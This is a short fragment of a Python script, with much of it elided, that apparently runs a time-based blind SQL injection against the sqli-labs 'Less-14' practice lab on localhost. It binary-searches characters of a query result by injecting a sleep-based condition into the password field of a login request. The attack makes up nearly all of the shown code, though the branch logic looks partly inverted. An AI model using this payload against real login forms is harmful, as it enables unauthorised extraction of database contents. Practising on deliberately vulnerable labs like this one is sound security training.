...
def sql_bool():
    ...
    for i in range(1, 1000):
        ...
        while low < high:
            ...
            data = {
                "uname": "1",
                "passwd": f"1\" and if(ascii(substr({payload},{i},1))>{mid},sleep(1),0) --+"
            }
            url = f"http://127.0.0.1:8888/sqli-labs-master/Less-14"

            try:
                res = requests.get(url=url, data=data, timeout=1)
                high = mid
